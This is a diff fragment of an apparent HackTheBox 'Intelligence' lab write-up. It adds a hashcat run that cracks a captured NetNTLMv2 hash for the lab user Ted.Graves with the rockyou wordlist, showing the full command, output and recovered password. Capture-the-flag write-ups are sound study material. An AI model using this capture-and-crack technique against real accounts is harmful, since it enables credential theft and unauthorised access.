@@ -531,3 +531,64 @@ DC=web,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=
 [HTTP] NTLMv2 Username : intelligence\Ted.Graves
 [HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:7e364817ffaf3be1:7693BEC2BAD21830AE57C84C927C461B:010100000000000079A500F629CBD701889579F2A0825A940000000002000800510030004700460001001E00570049004E002D00430048004F004A004E00550034003300540037004E000400140051003000470046002E004C004F00430041004C0003003400570049004E002D00430048004F004A004E00550034003300540037004E002E0051003000470046002E004C004F00430041004C000500140051003000470046002E004C004F00430041004C000800300030000000000000000000000000200000E348C885053BA6DC38160B59D8F10407C414F0E5D53457A57A77041046DE2C5C0A001000000000000000000000000000000000000900320048005400540050002F007700650062002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
 ```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/krbrelayx]
+└─# hashcat -m 5600 hash_ted_user /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: pthread-AMD Ryzen 7 4800H with Radeon Graphics, 2878/2942 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 5 secs
+
+TED.GRAVES::intelligence:7e364817ffaf3be1:7693bec2bad21830ae57c84c927c461b:010100000000000079a500f629cbd701889579f2a0825a940000000002000800510030004700460001001e00570049004e002d00430048004f004a004e00550034003300540037004e000400140051003000470046002e004c004f00430041004c0003003400570049004e002d00430048004f004a004e00550034003300540037004e002e0051003000470046002e004c004f00430041004c000500140051003000470046002e004c004f00430041004c000800300030000000000000000000000000200000e348c885053ba6dc38160b59d8f10407c414f0e5d53457a57a77041046de2c5c0a001000000000000000000000000000000000000900320048005400540050002f007700650062002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NetNTLMv2
+Hash.Target......: TED.GRAVES::intelligence:7e364817ffaf3be1:7693bec2b...000000
+Time.Started.....: Wed Oct 27 00:58:58 2021 (15 secs)
+Time.Estimated...: Wed Oct 27 00:59:13 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   762.2 kH/s (2.67ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10817536/14344385 (75.41%)
+Rejected.........: 0/10817536 (0.00%)
+Restore.Point....: 10813440/14344385 (75.38%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: Ms.Jordan -> Money01
+
+Started: Wed Oct 27 00:58:01 2021
+Stopped: Wed Oct 27 00:59:14 2021
+```
